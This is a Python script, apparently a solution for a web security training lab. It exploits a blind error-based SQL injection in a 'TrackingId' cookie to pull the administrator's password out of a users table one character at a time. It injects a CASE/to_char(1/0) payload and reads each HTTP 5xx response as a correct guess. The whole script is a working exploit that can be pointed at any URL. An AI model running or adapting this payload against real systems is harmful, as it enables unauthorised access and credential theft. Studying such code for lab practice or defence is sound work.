import requests
from urllib.parse import urlparse, parse_qs
import argparse

alpha_numeric = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"

def is_server_error(code):
    return str(code)[0] == '5'

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", dest="url")
    args = parser.parse_args()
    o = urlparse(args.url)
    url = o._replace(query=None).geturl()


    admin_password=""
    i=1
    end=False
    while not end:
        end=True
        for c in alpha_numeric:
            #Change the cookie id here
            cookies={"TrackingId":"NpeXkndBDq1r0phq'||(SELECT CASE WHEN (SUBSTR(password,"+ str(i) +",1) ='" + c + "') THEN to_char(1/0) ELSE '' END FROM users Where username='administrator')||'" }
            resp = requests.get(url, cookies=cookies)
            #print(resp.text)
            if is_server_error(resp.status_code):
                admin_password += c
                print(admin_password)
                i += 1
                end = False
                break


    print("Final output: {}".format(admin_password))



if __name__ == "__main__":
    main()